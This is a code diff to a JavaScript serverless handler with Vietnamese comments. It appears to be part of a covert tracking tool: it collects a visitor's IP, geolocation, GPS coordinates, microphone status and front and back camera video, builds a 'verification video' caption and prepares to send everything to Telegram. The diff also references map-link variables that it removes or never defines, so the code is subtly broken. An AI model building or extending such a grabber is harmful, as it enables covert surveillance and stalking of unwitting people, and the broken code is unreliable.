@@ -8,7 +8,6 @@ export default async function handler(req) {
     return new Response("Method Not Allowed", { status: 405 });
 
   try {
-    // 1. LẤY IP TỪ HEADER
     const userIP =
       req.headers.get("x-forwarded-for")?.split(",")[0] || 
       req.headers.get("cf-connecting-ip") ||
@@ -28,7 +27,6 @@ export default async function handler(req) {
       geo = {};
     }
 
-    // 2. NHẬN DỮ LIỆU TỪ CLIENT
     const contentType = req.headers.get("content-type") || "";
     let clientData = {};
     let formData = null;
@@ -49,7 +47,6 @@ export default async function handler(req) {
     const hasFront = formData && formData.has("front");
     const hasBack = formData && formData.has("back");
 
-    // 3. TỌA ĐỘ (ƯU TIÊN GPS)
     const finalLat = gpsLat !== 0 ? gpsLat : ipLat;
     const finalLon = gpsLon !== 0 ? gpsLon : ipLon;
     const lat = finalLat || 0;
@@ -57,12 +54,22 @@ export default async function handler(req) {
     
     const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
 
-    // 4. LINK GOOGLE MAPS CHUẨN
-    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    // 2. Link short (dạng @)
     const googleMapsShort = `https://maps.google.com/?q=${lat},${lon}`;
-    const googleMapsEmbed = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1000!2d${lon}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1svi!2s!4v${Date.now()}`;
+    // 5. Link với tên địa điểm (nếu có)
+    let locationName = '';
+    if (geo.cityName && geo.countryName) {
+      locationName = `${geo.cityName}, ${geo.countryName}`;
+    } else if (geo.regionName) {
+      locationName = geo.regionName;
+    }
+    const googleMapsName = locationName ? 
+      `https://www.google.com/maps/place/${encodeURIComponent(locationName)}/@${lat},${lon},15z` :
+      googleMapsPlace;
+    
+    // 6. Link dạng @ với zoom
+    const googleMapsZoom = `https://www.google.com/maps/@${lat},${lon},15z`;
 
-    // 5. CAPTION ĐẦY ĐỦ
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]
 
@@ -81,9 +88,12 @@ export default async function handler(req) {
 📍 Kinh độ (Sử dụng): ${lon}
 🎯 Độ chính xác GPS: ${clientData.accuracy || 'Không có'}m
 
-🗺️ Google Maps: ${googleMapsLink}
+🗺️ Google Maps (Full): ${googleMapsFull}
 📍 Google Maps (Short): ${googleMapsShort}
-📌 Google Maps Embed: ${googleMapsEmbed}
+📍 Google Maps (Place): ${googleMapsPlace}
+📍 Google Maps (Zoom 15): ${googleMapsZoom}
+📍 Google Maps (Tên): ${googleMapsName}
+📌 Google Maps (Embed): ${googleMapsEmbed}
 
 🎙️ Microphone: ${clientData.microphone || '❌ Không có quyền'}
 🎥 Video trước: ${hasFront ? '✅ Có' : '❌ Không'}
@@ -93,8 +103,9 @@ export default async function handler(req) {
 `.trim();
 
     console.log('📤 Bắt đầu gửi lên Telegram...');
+    console.log(`📍 Tọa độ: ${lat}, ${lon}`);
+    console.log(`🗺️ Google Maps Short: ${googleMapsShort}`);
 
-    // 6. GỬI LÊN TELEGRAM
     if (hasFront || hasBack) {
       if (hasFront) {
         const frontFile = formData.get("front");
